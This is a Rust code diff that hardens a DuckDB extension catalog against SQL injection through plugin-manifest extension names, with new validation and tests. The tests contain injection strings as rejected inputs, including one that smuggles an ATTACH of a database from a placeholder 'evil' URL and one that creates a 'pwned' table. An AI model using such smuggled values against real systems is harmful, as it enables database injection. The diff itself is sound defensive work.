@@ -58,10 +58,26 @@ pub struct Extension {
     pub handles: Vec<String>,
 }
 
+/// Whether `name` is something that can be written into `INSTALL` / `LOAD`.
+///
+/// DuckDB extension names are bare identifiers, so this is the whole of the
+/// alphabet: anything else is either a typo or an attempt to end the statement
+/// and start another one. A manifest is a file the user installed from a
+/// marketplace, not something this code wrote, so it is checked when the
+/// catalog is built *and* again at each SQL sink — the two are far apart, and
+/// an `Extension` can be constructed without going through the catalog.
+fn is_extension_name(name: &str) -> bool {
+    !name.is_empty() && name.bytes().all(|b| b.is_ascii_alphanumeric() || b == b'_')
+}
+
 impl Extension {
-    /// Read one out of a plugin's `[duckdb-extension]` section.
-    fn from_meta(meta: &crate::plugin::DuckdbExtensionMeta) -> Self {
-        Self {
+    /// Read one out of a plugin's `[duckdb-extension]` section, or `None` when
+    /// it does not name an extension DuckDB could be asked for.
+    fn from_meta(meta: &crate::plugin::DuckdbExtensionMeta) -> Option<Self> {
+        if !is_extension_name(&meta.extension) {
+            return None;
+        }
+        Some(Self {
             name: meta.extension.clone(),
             repository: match meta.repository.as_deref() {
                 Some("community") => Repository::Community,
@@ -80,7 +96,7 @@ impl Extension {
                 .iter()
                 .map(|e| e.trim_start_matches('.').to_ascii_lowercase())
                 .collect(),
-        }
+        })
     }
 }
 
@@ -97,7 +113,7 @@ pub fn catalog() -> Vec<Extension> {
         .get_all_plugin_by_capability(crate::plugin::Capability::DuckdbExtension)
         .iter()
         .filter_map(|p| p.duckdb_extension.as_ref())
-        .map(Extension::from_meta)
+        .filter_map(Extension::from_meta)
         .collect()
 }
 
@@ -191,6 +207,9 @@ pub fn is_installed(conn: &duckdb::Connection, name: &str) -> bool {
 /// A miss is not an error here — it is the ordinary state of an extension the
 /// user has not asked for, and the caller turns it into the offer.
 pub fn load(conn: &duckdb::Connection, name: &str) -> bool {
+    if !is_extension_name(name) {
+        return false;
+    }
     conn.execute_batch(&format!("LOAD {name};")).is_ok()
 }
 
@@ -199,6 +218,11 @@ pub fn load(conn: &duckdb::Connection, name: &str) -> bool {
 /// Measured cold at about a second for `excel` on a warm network, and it is a
 /// network call besides — so this belongs on a worker, never on the frame.
 pub fn install(conn: &duckdb::Connection, extension: &Extension) -> Result<()> {
+    if !is_extension_name(&extension.name) {
+        return Err(ThothError::DatabaseError {
+            reason: format!("'{}' does not name a DuckDB reader", extension.name),
+        });
+    }
     let sql = format!(
         "INSTALL {}{}; LOAD {};",
         extension.name,
@@ -242,7 +266,7 @@ mod tests {
 
     #[test]
     fn a_plugin_declares_everything_the_offer_needs() {
-        let e = Extension::from_meta(&meta("excel", Some("core"), &["xlsx", ".XLSM"]));
+        let e = Extension::from_meta(&meta("excel", Some("core"), &["xlsx", ".XLSM"])).unwrap();
         assert_eq!(e.name, "excel");
         assert_eq!(e.repository, Repository::Core);
         assert_eq!(e.unlocks, "Excel workbooks (.xlsx, .xlsm)");
@@ -257,12 +281,13 @@ mod tests {
         // `INSTALL arrow` without this fails with a download error that reads
         // like the network is down. It is the single reason Arrow looked
         // unsupported.
-        let community = Extension::from_meta(&meta("arrow", Some("community"), &["arrows"]));
+        let community =
+            Extension::from_meta(&meta("arrow", Some("community"), &["arrows"])).unwrap();
         assert_eq!(community.repository, Repository::Community);
         assert_eq!(Repository::Community.clause(), " FROM community");
 
         // Core is the default, so a manifest that omits it still works.
-        let unstated = Extension::from_meta(&meta("excel", None, &["xlsx"]));
+        let unstated = Extension::from_meta(&meta("excel", None, &["xlsx"])).unwrap();
         assert_eq!(unstated.repository, Repository::Core);
         assert_eq!(Repository::Core.clause(), "");
     }
@@ -277,9 +302,55 @@ mod tests {
             supported_extensions: vec!["xlsx".to_string()],
             unlocks: None,
             download_size: None,
-        });
+        })
+        .unwrap();
         assert!(!bare.unlocks.is_empty());
         assert!(!bare.size.is_empty());
+    }
+
+    #[test]
+    fn a_manifest_cannot_smuggle_sql_through_an_extension_name() {
+        // `extension` is interpolated into INSTALL and LOAD, and a manifest
+        // comes from a marketplace rather than from this code. A name that is
+        // not a bare identifier is not an extension, so it never reaches SQL:
+        // it is dropped when the catalog is built, and refused again at both
+        // sinks in case an `Extension` was built another way.
+        for hostile in [
+            "excel; ATTACH 'http://evil/x.db'",
+            "excel'",
+            "excel--",
+            "ex cel",
+            "",
+        ] {
+            assert!(
+                Extension::from_meta(&meta(hostile, Some("core"), &["xlsx"])).is_none(),
+                "{hostile:?} was accepted into the catalog"
+            );
+            assert!(!is_extension_name(hostile), "{hostile:?} passed the check");
+        }
+        // And the ordinary names still do.
+        for fine in ["excel", "sqlite_scanner", "arrow", "h3"] {
+            assert!(is_extension_name(fine), "{fine:?} was rejected");
+        }
+    }
+
+    #[test]
+    fn a_hostile_name_is_refused_at_the_sql_sinks_too() {
+        let conn = duckdb::Connection::open_in_memory().expect("in-memory duckdb");
+        let hostile = Extension {
+            name: "excel; CREATE TABLE pwned(x INT)".to_string(),
+            repository: Repository::Core,
+            unlocks: String::new(),
+            size: String::new(),
+            handles: Vec::new(),
+        };
+        assert!(install(&conn, &hostile).is_err());
+        assert!(!load(&conn, &hostile.name));
+        // The second statement never ran.
+        assert!(
+            conn.execute_batch("SELECT * FROM pwned").is_err(),
+            "the smuggled statement was executed"
+        );
     }
 
     #[test]
@@ -350,8 +421,16 @@ mod tests {
         assert!(!load(&conn, "definitely_not_an_extension"));
     }
 
+    /// `INSTALLED_REVISION` is process-wide and these tests read it either
+    /// side of a change, so the ones that touch it take turns.
+    fn revision_lock() -> std::sync::MutexGuard<'static, ()> {
+        static LOCK: std::sync::Mutex<()> = std::sync::Mutex::new(());
+        LOCK.lock().unwrap_or_else(|e| e.into_inner())
+    }
+
     #[test]
     fn installing_a_reader_moves_the_revision() {
+        let _guard = revision_lock();
         let before = revision();
         INSTALLED_REVISION.fetch_add(1, std::sync::atomic::Ordering::Release);
         assert_eq!(revision(), before + 1);
@@ -359,6 +438,7 @@ mod tests {
 
     #[test]
     fn a_failed_install_leaves_the_revision_alone() {
+        let _guard = revision_lock();
         // Otherwise every failure would send every open tab round the reopen
         // loop for a reader that still is not there.
         let conn = duckdb::Connection::open_in_memory().unwrap();
